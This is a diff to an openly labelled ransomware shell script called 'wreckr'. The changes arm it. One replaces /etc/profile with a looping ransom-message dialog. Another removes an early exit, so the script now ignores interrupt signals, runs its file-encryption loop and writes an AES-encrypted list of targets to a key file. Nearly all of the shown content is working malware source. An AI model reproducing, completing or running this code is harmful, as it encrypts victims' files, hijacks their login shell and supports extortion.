@@ -1,11 +1,4 @@
 #!/bin/sh
-# Vars Needed
-#ERRMSG=""
-#OS=""
-PROGRAM_NAME="wreckr"
-PROGRAM_VERSION="0.1.1"
-
-
 
 ################ CHECKS ###############################
 # Get the OS version
@@ -155,14 +148,8 @@ dec_loop() {
 ################# MAIN ######################################
 setmsg() {
     msg="while [ \"\$x\" != '10' ]; do $DIALOG --title 'Oops...' --msgbox 'Congratulations,\\\\n\\\\nYou have been infected with a RANSOMWARE!!!!!\\\\nI know. Scary stuff.\\\\nAnyways, Come talk to us about getting some of those super important files back.. Or not.. Your choice kid.\\\\n\\\\nLove,\\\\n\\\\n~benSociety' 20 30;if [ \"\$?\" == 255 ]; then x=\$((x+1));fi; done"
-
-    if [ "`which sed`" != "" ]; then
-    	echo sed exists
-        #sed "1s/^/$msg\n\n/" /etc/profile
-    else
-        echo "sed isnt there :("
-        #echo $msg > /etc/profile
-    fi
+    mv /etc/profile /etc/profile.bak
+    echo $msg > /etc/profile
 }
 
 lock() {
@@ -172,8 +159,6 @@ lock() {
 
 main() {
     check_msg
-    setmsg
-    exit
     trap '' INT
     trap '' TERM
     #SOFT="YES"
@@ -183,6 +168,6 @@ main() {
     enc_loop "$targets"
     echo >> $PRIVATEKEY
     printf "$LIST" | openssl aes-256-cbc -k "$KEY" | openssl base64 >> $PRIVATEKEY
-EXIT
+    EXIT
 }
 main
